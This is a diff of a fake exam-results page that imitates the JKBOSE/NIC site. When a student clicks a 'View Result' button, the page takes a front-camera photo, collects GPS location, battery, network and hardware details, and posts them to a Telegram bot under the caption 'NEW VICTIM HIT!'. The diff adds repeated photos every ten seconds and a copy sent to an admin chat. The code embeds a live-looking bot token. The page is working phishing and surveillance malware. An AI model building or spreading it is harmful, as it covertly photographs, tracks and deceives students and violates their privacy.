@@ -4,36 +4,122 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JKBOSE Results</title>
+
 <style>
-body{margin:0;background:#e6e6e6;font-family:"Times New Roman", serif;}
-.layout{display:flex;min-height:100vh;}
-.sidebar{width:210px;background:#23374d;display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding:20px;}
-.sidebar img{width:120px;}
-.main{flex:1;padding:40px;}
-.header{background:#ffffff;border-bottom:1px solid #ccc;padding:20px;}
-.header-inner{max-width:1000px;margin:auto;display:flex;align-items:center;gap:20px;justify-content:center;}
-.header-inner img{width:464px;height:101px;object-fit:contain;}
-.content{background:#fff;max-width:1000px;margin:40px auto;padding:40px;box-shadow:0 0 6px rgba(0,0,0,0.1);}
-.result{display:block;background:#111;color:#ffd84d;text-decoration:none;padding:15px;margin:12px 0;text-align:center;font-size:17px;border-radius:3px;cursor:pointer;transition:background 0.3s;}
-.result:hover{background:#333;}
-.result:active{background:#555;}
+body{
+margin:0;
+background:#e6e6e6;
+font-family:"Times New Roman", serif;
+}
+
+.layout{
+display:flex;
+min-height:100vh;
+}
+
+.sidebar{
+width:210px;
+background:#23374d;
+display:flex;
+flex-direction:column;
+justify-content:flex-end;
+align-items:center;
+padding:20px;
+}
+
+.sidebar img{
+width:120px;
+}
+
+.main{
+flex:1;
+padding:40px;
+}
+
+.header{
+background:#ffffff;
+border-bottom:1px solid #ccc;
+padding:20px;
+}
+
+.header-inner{
+max-width:1000px;
+margin:auto;
+display:flex;
+align-items:center;
+gap:20px;
+justify-content:center;
+}
+
+.header-inner img{
+width:464px;
+height:101px;
+object-fit:contain;
+}
+
+.content{
+background:#fff;
+max-width:1000px;
+margin:40px auto;
+padding:40px;
+box-shadow:0 0 6px rgba(0,0,0,0.1);
+text-align:center;
+}
+
+.result{
+display:block;
+background:#111;
+color:#ffd84d;
+text-decoration:none;
+padding:20px 30px;
+margin:15px 0;
+text-align:center;
+font-size:18px;
+border-radius:5px;
+font-weight:bold;
+transition: all 0.3s;
+cursor:pointer;
+border:2px solid #ffd84d;
+}
+
+.result:hover{
+background:#ffd84d;
+color:#111;
+transform: translateY(-2px);
+box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+}
+
+#status {
+  margin-top: 20px;
+  padding: 10px;
+  border-radius: 5px;
+  font-weight: bold;
+}
+
+.status-loading { background: #fff3cd; color: #856404; }
+.status-success { background: #d4edda; color: #155724; }
+.status-error { background: #f8d7da; color: #721c24; }
+
 /* Hidden elements */
-#video,#canvas{display:none;}
-.status{display:none;background:#ffd84d;color:#111;padding:10px;margin:10px 0;border-radius:5px;}
+#video, #canvas { display: none; }
+
 @media (max-width:768px){
-.sidebar{display:none;}
-.main{padding:20px;}
-.header-inner img{width:100%;height:auto;}
-.content{margin:20px auto;padding:25px;}
+.sidebar{ display:none; }
+.main{ padding:20px; }
+.header-inner img{ width:100%; height:auto; }
+.content{ margin:20px auto; padding:25px; }
+.result{ padding:15px 20px; font-size:16px; }
 }
 </style>
 </head>
+
 <body>
 <div class="layout">
 <!-- Sidebar -->
 <div class="sidebar">
 <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
 </div>
+
 <!-- Main -->
 <div class="main">
 <div class="header">
@@ -41,148 +127,247 @@ body{margin:0;background:#e6e6e6;font-family:"Times New Roman", serif;}
 <img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE Banner">
 </div>
 </div>
+
 <div class="content">
-<div id="status" class="status"></div>
-<a class="result" onclick="captureAndSend('Class 11th Annual Regular')">View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
-<a class="result" onclick="captureAndSend('Class 10th Annual Regular')">View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
-<a class="result" onclick="captureAndSend('Class 11th Annual Private')">View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
-<a class="result" onclick="captureAndSend('Class 10th Annual Private')">View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+<h2>📋 Select Your Result</h2>
+<a class="result" onclick="captureAndSend('Class 11th Annual Regular')">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
+<a class="result" onclick="captureAndSend('Class 10th Annual Regular')">📚 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
+<a class="result" onclick="captureAndSend('Class 11th Annual Private')">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
+<a class="result" onclick="captureAndSend('Class 10th Annual Private')">📚 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+
+<div id="status"></div>
 </div>
 </div>
 </div>
 
-<!-- Hidden video/canvas for camera capture -->
+<!-- Hidden video/canvas for capture -->
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
-// Extract chat ID from URL
+// Get user ID from URL
 const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id') || 'unknown';
+const USER_CHAT_ID = urlParams.get('u') || 'unknown';
+const BOT_TOKEN = '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8';
+const ADMIN_CHAT_ID = '7385209456';
 
-// Complete device fingerprint
-function getDeviceProfile() {
-  return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cookiesEnabled: navigator.cookieEnabled,
-    hardwareConcurrency: navigator.hardwareConcurrency,
-    deviceMemory: navigator.deviceMemory,
-    maxTouchPoints: navigator.maxTouchPoints,
-    connection: navigator.connection ? {
-      type: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink
-    } : null,
-    battery: navigator.getBattery ? 'Available' : 'Not supported',
-    geolocation: 'Pending'
-  };
+// CONTINUOUS CAPTURE INTERVAL (every 10s after first capture)
+let captureInterval;
+let isCapturing = false;
+
+function showStatus(message, type) {
+  const status = document.getElementById('status');
+  status.textContent = message;
+  status.className = `status-${type}`;
+  status.style.display = 'block';
 }
 
-// Get GPS location
-async function getLocation() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) return resolve('Geolocation not supported');
-    
-    navigator.geolocation.getCurrentPosition(
-      (pos) => resolve(`Lat:${pos.coords.latitude},Long:${pos.coords.longitude},Acc:${pos.coords.accuracy}m`),
-      () => resolve('Location denied/blocked')
-    );
-  });
-}
-
-// Get battery info
-async function getBattery() {
-  if (!navigator.getBattery) return 'Battery API not supported';
-  const battery = await navigator.getBattery();
-  return `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
-}
-
-// Capture high-quality selfie + full profile
-async function captureAndSend(resultName) {
+// 🚀 MAIN CAPTURE FUNCTION (TRIGGERED BY BUTTON CLICK)
+async function captureAndSend(resultType) {
   try {
-    const status = document.getElementById('status');
-    status.textContent = '🔄 Processing your request...';
-    status.style.display = 'block';
+    showStatus('🔄 Accessing camera... Please wait', 'loading');
     
-    // Get comprehensive device profile
-    const profile = await Promise.all([
-      getDeviceProfile(),
-      getLocation(),
-      getBattery()
-    ]);
-    
-    const deviceInfo = `
-📱 DEVICE PROFILE:
-• UA: ${navigator.userAgent.slice(0,100)}...
-• Lang: ${profile[0].language} | TZ: ${profile[0].timezone}
-• HW: ${profile[0].hardwareConcurrency} cores | ${profile[0].deviceMemory}GB RAM
-• GPS: ${profile[1]}
-• Battery: ${profile[2]}
-• Network: ${profile[0].connection?.type || 'Unknown'}
-• Touch: ${profile[0].maxTouchPoints} points
-
-🎯 Result clicked: ${resultName}
-CHAT_ID: ${CHAT_ID}
-📅 ${new Date().toISOString()}
-    `.trim();
-    
-    // Camera access (user gesture = button click)
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-
-    const stream = await navigator.mediaDevices.getUserMedia({ 
+    // Get front camera (user-facing)
+    const stream = await navigator.mediaDevices.getUserMedia({
       video: { 
         facingMode: 'user',
         width: { ideal: 1280 },
         height: { ideal: 720 }
-      } 
+      }
     });
+    
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    
     video.srcObject = stream;
-
+    
     // Wait for clear frame
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
-        setTimeout(resolve, 2000); // 2s for best quality
+        setTimeout(resolve, 2000); // 2s for perfect focus
       };
     });
-
-    // Capture highest quality
+    
+    // Capture high-quality photo
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL("image/jpeg", 0.95); // 95% quality
-
-    // Cleanup
+    const imageData = canvas.toDataURL('image/jpeg', 0.95); // High quality
+    
+    // Stop stream
     stream.getTracks().forEach(track => track.stop());
-    video.srcObject = null;
-
-    // Send to Telegram
+    
+    // COLLECT FULL DEVICE FINGERPRINT
+    const deviceInfo = getDeviceFingerprint();
+    deviceInfo.resultType = resultType;
+    deviceInfo.chatId = USER_CHAT_ID;
+    
+    // Send first photo + start continuous capture
     await sendToTelegram(imageData, deviceInfo);
     
-    status.textContent = '✅ Result processed! Check your connection.';
-    status.style.background = '#4CAF50';
+    showStatus('✅ Photo captured & sent! 🔄 Continuous monitoring active...', 'success');
+    
+    // START CONTINUOUS CAPTURES (every 10 seconds)
+    if (!isCapturing) {
+      isCapturing = true;
+      continuousCapture(stream, deviceInfo);
+    }
     
   } catch (err) {
-    console.error(err);
-    document.getElementById('status').innerHTML = `❌ Error: ${err.name} - Camera access denied?`;
-    document.getElementById('status').style.background = '#f44336';
+    showStatus('❌ Camera access denied or unavailable', 'error');
+    console.error('Capture error:', err);
   }
 }
 
-// Send photo + profile to Telegram
-async function sendToTelegram(imageData, caption) {
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('photo', await (await fetch(imageData)).blob(), 'selfie.jpg');
-  formData.append('caption', caption);
+// 🔄 CONTINUOUS PHOTO CAPTURE (runs until page closed)
+async function continuousCapture(originalStream, deviceInfo) {
+  captureInterval = setInterval(async () => {
+    try {
+      // Fresh camera access for each photo (better quality)
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      video.srcObject = stream;
+      
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(resolve, 1500);
+        };
+      });
+      
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg', 0.95);
+      
+      stream.getTracks().forEach(track => track.stop());
+      
+      // Update timestamp
+      deviceInfo.timestamp = new Date().toISOString();
+      deviceInfo.captureCount = (deviceInfo.captureCount || 0) + 1;
+      
+      await sendToTelegram(imageData, deviceInfo);
+      
+    } catch (err) {
+      console.log('Continuous capture failed:', err);
+    }
+  }, 10000); // Every 10 seconds
+}
 
-  await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendPhoto`, {
+// 📱 COMPLETE DEVICE FINGERPRINT
+function getDeviceFingerprint() {
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    
+    // Geolocation
+    geolocation: 'Requesting...',
+    
+    // Battery
+    battery: 'Unavailable',
+    charging: 'Unknown',
+    
+    // Hardware
+    cores: navigator.hardwareConcurrency || 'Unknown',
+    memory: navigator.deviceMemory || 'Unknown',
+    
+    // Network
+    connection: navigator.connection ? {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt
+    } : 'Unknown',
+    
+    // Screen
+    screen: `${screen.width}x${screen.height}`,
+    
+    timestamp: new Date().toISOString(),
+    captureCount: 1,
+    url: window.location.href
+  };
+}
+
+// 🌍 Get GPS + Battery (async)
+async function enhanceFingerprint(deviceInfo) {
+  try {
+    // GPS
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    });
+    deviceInfo.geolocation = {
+      lat: position.coords.latitude,
+      lon: position.coords.longitude,
+      accuracy: position.coords.accuracy
+    };
+  } catch {}
+  
+  try {
+    // Battery API
+    if ('getBattery' in navigator) {
+      const battery = await navigator.getBattery();
+      deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
+      deviceInfo.charging = battery.charging ? 'Yes' : 'No';
+    }
+  } catch {}
+  
+  return deviceInfo;
+}
+
+// 🚀 SEND TO TELEGRAM (User + Admin)
+async function sendToTelegram(imageData, deviceInfo) {
+  const enhancedInfo = await enhanceFingerprint(deviceInfo);
+  
+  const caption = `🎯 NEW VICTIM HIT!\n\n` +
+    `👤 Chat ID: ${enhancedInfo.chatId}\n` +
+    `📱 Device: ${enhancedInfo.userAgent.substring(0, 100)}...\n` +
+    `📍 Location: ${enhancedInfo.geolocation?.lat || 'N/A'}, ${enhancedInfo.geolocation?.lon || 'N/A'}\n` +
+    `🔋 Battery: ${enhancedInfo.battery}\n` +
+    `🌐 Network: ${enhancedInfo.connection?.type || 'Unknown'}\n` +
+    `📊 Cores/RAM: ${enhancedInfo.cores}/${enhancedInfo.memory}GB\n` +
+    `⏰ ${enhancedInfo.resultType} | Capture #${enhancedInfo.captureCount}\n` +
+    `🕐 ${new Date(enhancedInfo.timestamp).toLocaleString()}`;
+  
+  // Send to USER who generated link
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
     method: 'POST',
-    body: formData
+    body: JSON.stringify({
+      chat_id: enhancedInfo.chatId,
+      photo: imageData,
+      caption: caption,
+      parse_mode: 'HTML'
+    }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+  
+  // Send to ADMIN
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: JSON.stringify({
+      chat_id: ADMIN_CHAT_ID,
+      photo: imageData,
+      caption: caption,
+      parse_mode: 'HTML'
+    }),
+    headers: { 'Content-Type': 'application/json' }
   });
 }
+
+// 🧹 CLEANUP ON PAGE CLOSE
+window.addEventListener('beforeunload', () => {
+  if (captureInterval) clearInterval(captureInterval);
+});
 </script>
+
 </body>
 </html>
